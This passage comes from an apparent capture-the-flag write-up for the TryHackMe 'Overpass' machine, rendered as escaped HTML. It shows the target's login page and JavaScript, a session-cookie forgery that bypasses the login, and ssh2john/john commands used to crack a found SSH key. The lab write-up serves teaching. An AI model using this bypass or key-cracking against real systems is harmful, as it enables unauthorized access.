    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE=edge&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Overpass&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;media=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;screen&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/css/main.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;media=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;screen&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/css/login.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;image/png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/img/overpass.png&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/main.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/cookie.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;onLoad()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;nav&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;logo&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/img/overpass.svg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overpass logo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navTitle&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Overpass&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/aboutus&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;About Us&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/downloads&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Downloads&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/nav&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Administrator area&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Please log in to access this content&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formTitle&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Overpass administrator login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;loginForm&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formElem&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formElem&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;
                    &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;loginStatus&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;/login.js looks interesting.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;postData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Default options are marked with *&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// *GET, POST, PUT, DELETE, etc.&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'no-cache'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// *default, no-cache, reload, force-cache, only-if-cached&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'same-origin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// include, *same-origin, omit&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'application/x-www-form-urlencoded'&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'follow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// manual, *follow, error&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;referrerPolicy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'no-referrer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// no-referrer, *client&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encodeFormData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// body data type must match &quot;Content-Type&quot; header&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// We don't always want JSON back&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encodeFormData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onLoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#loginForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//on pressing enter&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;usernameBox&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;passwordBox&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;loginStatus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#loginStatus&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;loginStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;creds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;usernameBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;passwordBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;postData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;creds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;statusOrCookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;statusOrCookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Incorrect credentials&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;loginStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Incorrect Credentials&quot;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;passwordBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SessionToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;statusOrCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/admin&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at the login function it appears the script will send a post request to /api/login and wait for a response. If the response equals “Incorrect credentials” the text is displayed to the user and the password field is reset to blank. However if the response does not equal “Incorrect credentials” a cookie is set. I wonder if I can set the cooke to any value and it will allow me to log in?&lt;/p&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;

&lt;p&gt;First I clear the data and cookies from my browser. Then using a cookie editor I add the session token with a random value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/cookie.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now when I refresh the page I’m logged in and find James’s SSH key.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/key.png&quot; alt=&quot;key&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The key is encrypted so if I try and use it to log in it wont work unless I provide a password. I can use John to first get the hash and then crack to get the password. I coped the key to a text file called ‘key’, than ran ssh2john to get the hash. Then used john to crack it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $/usr/share/john/ssh2john.py key &amp;gt; hash
┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $john --format=ssh hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
